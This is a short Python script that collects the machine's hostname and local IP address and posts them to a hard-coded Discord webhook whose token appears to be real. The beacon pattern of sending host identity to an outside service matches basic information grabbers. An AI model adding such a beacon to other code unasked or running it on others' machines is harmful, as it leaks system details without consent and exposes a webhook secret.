import requests
import socket

# Replace this with your actual webhook URL
webhook_url = 'https://discord.com/api/webhooks/1336151237124690092/Gtm2kbpv5grLeF-nMXpEMWQYE_kKxVtt0_PEn62rYZzzmEbD02g3nqGR6eGt2uRNL-7Z'

# Get the local IP address
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

# Message content
data = {
    'content': f'📡 IP Address: `{ip_address}` from `{hostname}`'
}

# Send the POST request
response = requests.post(webhook_url, json=data)

# Print status
print("Sent!" if response.status_code == 204 else f"Failed: {response.status_code}")
